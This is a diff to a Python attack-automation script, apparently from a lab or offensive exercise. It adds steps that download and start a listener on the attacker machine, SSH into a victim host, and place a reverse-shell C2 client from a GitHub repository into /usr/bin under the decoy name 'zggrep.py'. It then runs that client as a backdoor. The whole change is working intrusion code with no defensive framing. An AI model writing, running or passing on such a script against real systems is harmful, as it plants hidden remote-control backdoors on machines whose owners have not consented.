@@ -2,6 +2,8 @@
 import subprocess, config
 
 victim_ip = config.VICTIM_IP
+backdoor_path = config.BACKDOOR_PATH
+listener_path = config.LISTENER_PATH
 
 def run_command(cmd, timeout=30):
     """Run a command and return (success, output)."""
@@ -18,6 +20,14 @@ def run_command(cmd, timeout=30):
         return False, e.stderr.strip()
     except (subprocess.TimeoutExpired, FileNotFoundError) as e:
         return False, str(e)
+    
+# download listener
+ok, output = run_command(["curl", "-o", "listener.py", f"{listener_path}"])
+print(f"listener downloaded on attacker machine" if ok else "Failed", "->", output)
+
+# run listener
+ok, output = run_command(["python3", "listener.py"])
+print(f"listener run on attacker host" if ok else "Failed", "->", output)
 
 # ssh user@192.168.64.6
 ok, output = run_command(["ssh", f"user@{victim_ip}"])
@@ -45,5 +55,11 @@ if ok:
 ok, output = run_command(["cd", "../../usr/bin"])
 print(f"entered /usr/bin" if ok else "Failed", "->", output)
 
-# curl -o myfile.txt https://raw.githubusercontent.com/USER/REPO/main/path/to/file.txt
-ok, output = run_command(["curl", "-o", "zggrep.py", ])
+# curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py
+ok, output = run_command(["curl", "-o", "zggrep.py", f"{backdoor_path}"])
+print(f"backdoor downloaded on w4 host" if ok else "Failed", "->", output)
+
+# run payload on the victim host
+ok, output = run_command(["python3", "zggrep.py"])
+print(f"backdoor run on listener, payload executed" if ok else "Failed", "->", output)
+
